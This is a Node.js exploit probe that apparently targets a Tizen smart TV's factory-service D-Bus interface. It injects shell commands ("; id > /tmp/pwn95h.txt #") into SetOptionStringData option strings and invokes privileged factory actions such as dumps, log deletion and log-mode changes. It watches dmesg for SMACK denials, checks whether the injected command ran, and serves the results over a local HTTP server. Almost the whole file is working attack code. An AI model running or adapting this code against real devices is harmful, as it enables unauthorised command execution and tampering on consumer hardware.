'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8184;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe95h.txt';
var PWN = '/tmp/pwn95h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 0. Pre-create pwn file with OUR label (so kfactoryd overwrite keeps our label)
  'try {',
  '  fs.writeFileSync("' + PWN + '", "pre-exists\\n");',
  '  r.pwn_precreated = true;',
  '} catch(e) { r.pwn_precreate_err = e.message.slice(0,60); }',

  // 1. Try SetOptionStringData injection on keys 0,1,2,4,5,6 (model/tuner/platform strings)
  //    These have known values - inject command suffix after the value
  'r.inject_opts = {};',
  // key0 = model '55A1AU0QN' — try injecting after it
  'try {',
  '  var inj0 = "55A1AU0QN; id > ' + PWN + ' #";',
  '  var o0 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0",inj0,String(inj0.length)],{timeout:5000});',
  '  r.inject_opts.k0_inject = (o0.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // key4 = tuner 'S_T2C' — try injecting
  'try {',
  '  var inj4 = "S_T2C; id > ' + PWN + ' #";',
  '  var o4 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","4",inj4,String(inj4.length)],{timeout:5000});',
  '  r.inject_opts.k4_inject = (o4.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // key6 = model variant 'Q-F-NQ6-55' — try injecting
  'try {',
  '  var inj6 = "Q-F-NQ6; id > ' + PWN + ' #";',
  '  var o6 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","6",inj6,String(inj6.length)],{timeout:5000});',
  '  r.inject_opts.k6_inject = (o6.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // key2 = platform 'QNQ6F' — try injecting (short, 5 chars)
  'try {',
  '  var inj2 = "QNQ6F; id > ' + PWN + ' #";',
  '  var o2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","2",inj2,String(inj2.length)],{timeout:5000});',
  '  r.inject_opts.k2_inject = (o2.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',

  // 2. Dmesg baseline (count lines)
  'var dmesg_base = 0;',
  'try {',
  '  var o_dm0 = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  dmesg_base = (o_dm0.stdout||new Buffer(0)).toString().split("\\n").length;',
  '  r.dmesg_baseline_lines = dmesg_base;',
  '} catch(e) {}',

  // 3. Execute dump items one at a time, check dmesg change and /tmp
  'r.dump_execs = {};',
  'var dump_keys = [12803, 22803, 32803, 42803, 52803];',
  'var dump_names = ["MRT_Dump","Sub_Dump","Eng_Dump","Pic_Dump","VCONF_Dump"];',
  'dump_keys.forEach(function(dk, di) {',
  '  try {',
  '    var o_e = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(dk),"0"],{timeout:12000});',
  '    var eout = (o_e.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '    var dm_new = cp.spawnSync("dmesg",[],{timeout:3000});',
  '    var dm_lines = (dm_new.stdout||new Buffer(0)).toString().split("\\n");',
  '    var new_lines = dm_lines.slice(dmesg_base).filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("execl")>-1||l.indexOf("system")>-1||l.indexOf("before")>-1||l.indexOf("string")>-1||l.indexOf("SMACK")>-1||l.indexOf("audit")>-1||l.indexOf("denied")>-1; });',
  '    dmesg_base = dm_lines.length;',
  '    r.dump_execs[dump_names[di]] = { result: eout, new_dmesg: new_lines.join("\\n").slice(0,500) };',
  '  } catch(e) { r.dump_execs[dump_names[di]] = { err: e.message.slice(0,40) }; }',
  '});',

  // 4. Executes(3, 0..4) with debug mode ON — might work now
  'r.exec3_debug_on = {};',
  'for (var c = 0; c <= 4; c++) {',
  '  try {',
  '    var o_3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","3",String(c)],{timeout:5000});',
  '    r.exec3_debug_on["c"+c] = (o_3.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 5. SetParameter experiments on log type (12405) + execute
  'try {',
  '  var o_sp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","12405","2"],{timeout:5000});',
  '  r.setparam_logtype_2 = (o_sp.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',
  'try {',
  '  var o_lv = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","22405","0"],{timeout:10000});',
  '  r.exec_logview_type2 = (o_lv.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 6. SaveLog with mode 2 (now that debug=1)
  'try {',
  '  var o_sl2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SaveLog","2"],{timeout:8000});',
  '  r.savelog2 = (o_sl2.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 7. Executes on a few more specific items
  'r.other_execs = {};',
  'var other_keys = [32405, 1503, 2903, 1003];', // Delete Log, Log Analyzer, Read Eco Sensor, Cert Option
  'var other_names = ["Delete_Log","Log_Analyzer","Read_Eco","Cert_Option"];',
  'other_keys.forEach(function(ok, oi) {',
  '  try {',
  '    var o_o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(ok),"0"],{timeout:8000});',
  '    r.other_execs[other_names[oi]] = (o_o.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '});',

  // 8. GetFString(11..30)
  'r.fstrings_11_30 = {};',
  'for (var ft = 11; ft <= 30; ft++) {',
  '  try {',
  '    var o_fs = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetFString",String(ft)],{timeout:3000});',
  '    var fsout = (o_fs.stdout||new Buffer(0)).toString().trim();',
  '    if (fsout && fsout !== "(1,)" && fsout.length > 10) r.fstrings_11_30["ft"+ft] = fsout.slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 9. Full dmesg - last 40 lines + any new SMACK audit denials
  'try {',
  '  var o_dm2 = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm_all = (o_dm2.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_tail40 = dm_all.slice(-40).join("\\n").slice(0,3000);',
  '  r.dmesg_audits = dm_all.filter(function(l){ return l.indexOf("audit")>-1&&l.indexOf("denied")>-1&&l.indexOf("path=")>-1; }).slice(-20).join("\\n").slice(0,2000);',
  '} catch(e) {}',

  // 10. Check /tmp for any new files and read our pwn file
  'try {',
  '  r.pwn_content = fs.readFileSync("' + PWN + '","utf8").trim();',
  '} catch(e) { r.pwn_err = e.message.slice(0,60); }',
  'try {',
  '  r.tmp_new_files = fs.readdirSync("/tmp").filter(function(f){',
  '    return f.indexOf("pwn")>-1||f.indexOf("dump")>-1||f.indexOf("mrt")>-1||f.indexOf("vconf")>-1||f.indexOf("eng")>-1;',
  '  });',
  '} catch(e) {}',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
